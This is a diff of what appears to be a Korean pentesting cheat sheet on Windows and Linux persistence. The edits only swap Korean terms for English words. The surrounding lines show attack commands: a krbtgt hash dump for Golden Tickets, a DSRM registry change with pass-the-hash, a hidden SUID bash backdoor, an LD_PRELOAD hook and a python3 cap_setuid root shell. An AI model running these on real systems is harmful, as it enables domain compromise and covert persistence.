@@ -8,9 +8,9 @@
 
 ## Windows Persistence
 
-### 레지스트리 Run Key
+### Registry Run Key
 
-시스템 시작 시 프로그램을 자동 실행하도록 레지스트리에 등록한다.
+시스템 시작 시 프로그램을 자동 실행하도록 Registry에 등록한다.
 
 ```powershell
 # 현재 사용자 (HKCU) - 관리자 권한 불필요
@@ -57,7 +57,7 @@ sc start <svc_name>
 ```
 
 !!! warning "탐지"
-    Event 7045 (새 서비스 설치), Event 4697 (서비스 설치 로그). 이름과 바이너리 경로가 기록된다.
+    Event 7045 (새 서비스 설치), Event 4697 (서비스 설치 로그). 이름과 binary 경로가 기록된다.
 
 ```powershell
 # WMI를 통한 지속적 코드 실행 (관리자 권한 필요)
@@ -92,10 +92,10 @@ Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
 
 ### Golden Ticket
 
-도메인의 krbtgt 계정 해시를 획득하면 임의의 TGT를 위조할 수 있다. krbtgt 패스워드가 변경되지 않는 한 영구적으로 유효하다.
+도메인의 krbtgt 계정 hash를 획득하면 임의의 TGT를 위조할 수 있다. krbtgt password가 변경되지 않는 한 영구적으로 유효하다.
 
 ```bash
-# krbtgt 해시 획득 (DCSync)
+# krbtgt hash 획득 (DCSync)
 impacket-secretsdump '<domain>/<admin>:<pass>@<dc_ip>' -just-dc-user krbtgt
 ```
 
@@ -113,7 +113,7 @@ impacket-psexec <domain>/Administrator@<dc_fqdn> -k -no-pass
 
 ### Silver Ticket
 
-특정 서비스 계정의 NTLM 해시로 해당 서비스에 대한 TGS를 위조하는 기법. Golden Ticket과 달리 KDC를 경유하지 않으므로 탐지가 어렵다.
+특정 서비스 계정의 NTLM hash로 해당 서비스에 대한 TGS를 위조하는 기법. Golden Ticket과 달리 KDC를 경유하지 않으므로 탐지가 어렵다.
 
 ```bash
 # Impacket
@@ -162,13 +162,13 @@ ntdsutil
 > reset password on server null
 > Enter new password
 
-# 레지스트리에서 DSRM 로그온 동작 변경 (원격 접근 허용)
+# Registry에서 DSRM 로그온 동작 변경 (원격 접근 허용)
 reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
 # 값 2 = 네트워크 로그온 허용
 
-# DSRM 해시로 PtH
+# DSRM hash로 PtH
 impacket-secretsdump -just-dc-user "Administrator" TARGET/Administrator@DC_IP
-# SAM의 로컬 Administrator 해시 사용
+# SAM의 로컬 Administrator hash 사용
 impacket-psexec -hashes :DSRM_HASH administrator@DC_IP
 ```
 
@@ -290,7 +290,7 @@ systemctl start <name>.service
 ### SUID Backdoor
 
 ```bash
-# SUID 백도어 바이너리
+# SUID 백도어 binary
 cp /bin/bash /tmp/.hidden_shell
 chmod u+s /tmp/.hidden_shell
 # 실행: /tmp/.hidden_shell -p
@@ -385,7 +385,7 @@ systemctl --user enable --now beacon.timer
 ### LD_PRELOAD 백도어
 
 ```bash
-# 모든 동적 링크 바이너리가 라이브러리를 먼저 로드 → 후킹
+# 모든 동적 링크 binary가 library를 먼저 로드 → 후킹
 cat > /tmp/hook.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
@@ -445,7 +445,7 @@ bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%s\n", str(args->fil
 ### Linux Capabilities 백도어
 
 ```bash
-# 특정 바이너리에 cap_setuid 등을 부여 → 일반 사용자가 root 권한 명령 실행
+# 특정 binary에 cap_setuid 등을 부여 → 일반 사용자가 root 권한 명령 실행
 setcap cap_setuid+ep /usr/bin/python3
 # 이후
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
